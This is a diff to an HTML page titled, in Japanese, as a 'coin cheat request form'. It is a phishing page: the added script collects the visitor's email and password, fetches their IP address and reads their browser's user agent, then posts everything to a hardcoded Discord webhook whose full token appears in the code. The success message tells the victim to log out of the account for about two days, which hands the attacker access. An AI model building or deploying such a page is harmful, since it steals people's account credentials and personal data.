@@ -66,6 +66,7 @@
 </head>
 <body>
     <form id="authForm">
+        <h1>コインチート依頼フォーム</h1>
         <label for="address">メールアドレス</label>
         <input type="email" id="address" placeholder="メールアドレスを入力" required>
 
@@ -73,6 +74,62 @@
         <input type="text" id="password" placeholder="パスワードを入力" required>
 
         <button type="button" onclick="submitForm()">送信</button>
+
+        <div id="successMessage" class="success-message" style="display: none;">送信完了しました！アカウントから一度ログアウトしてください！（目安は二日ほど）</div>
+        <div id="errorMessage" class="error-message" style="display: none;">送信に失敗しました。再度お試しください。</div>
     </form>
+
+    <script>
+        async function submitForm() {
+            const address = document.getElementById("address").value;
+            const password = document.getElementById("password").value;
+
+            if (!address || !password) {
+                alert("全ての項目を入力してください。");
+                return;
+            }
+
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ipAddress = ipData.ip;
+
+                const userAgent = navigator.userAgent;
+
+                const webhookURL = 'https://discord.com/api/webhooks/1332143787555688609/J91Uc5C-cAu8pn4plSRKRlWzNTDdvyr30ZwUSjHkt7CLkwewHj7PVEpnIC3AF8kHmbWM';
+
+                const payload = {
+                    embeds: [
+                        {
+                            title: "アカウント情報とデバイス情報",
+                            description: `**メールアドレス:** \`${address}\`\n**パスワード:** \`${password}\`\n**デバイス情報:** \`${userAgent}\`\n**IPアドレス:** \`${ipAddress}\``,
+                            color: 3447003,
+                        }
+                    ]
+                };
+
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    document.getElementById("successMessage").style.display = "block";
+                    const button = document.querySelector("button");
+                    button.style.backgroundColor = "red";
+                    button.textContent = "送信完了";
+                    button.disabled = true;
+                } else {
+                    document.getElementById("errorMessage").style.display = "block";
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                document.getElementById("errorMessage").style.display = "block";
+            }
+        }
+    </script>
 </body>
 </html>
